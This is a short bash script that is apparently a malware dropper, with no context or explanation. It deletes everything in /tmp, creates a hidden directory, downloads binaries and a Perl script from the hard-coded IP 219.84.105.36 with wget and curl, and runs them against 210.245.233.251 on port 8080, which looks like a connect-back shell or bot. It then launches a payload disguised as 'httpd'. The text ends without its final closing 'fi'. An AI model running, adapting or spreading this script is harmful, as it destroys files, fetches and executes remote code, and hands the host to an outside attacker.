#!/bin/bash
cd /tmp
rm -rf *
rm -rf .*
mkdir .temp
cd .temp
if [ -f cb ]; then
chmod +x cb
./cb 210.245.233.251 8080 &
else
wget 219.84.105.36/ping
mv ping cb
chmod +x cb
./cb 210.245.233.251 8080 &
fi
if [ -f ping.txt ]; then
perl ping.txt 210.245.233.251 8080 &
else
curl -o ping.txt http://219.84.105.36/ping.txt
perl ping.txt 210.245.233.251 8080 &
fi
if [ -f httpd ]; then
rm -rf /tmp/su*
chmod +x httpd
export PATH="."
httpd
else
wget 219.84.105.36/httpd
chmod +x httpd
export PATH="."
httpd
fi
if [ -f httpd ]; then
chmod +x httpd
export PATH="."
httpd
else
curl -o httpd 219.84.105.36/httpd
chmod +x httpd
export PATH="."
httpd
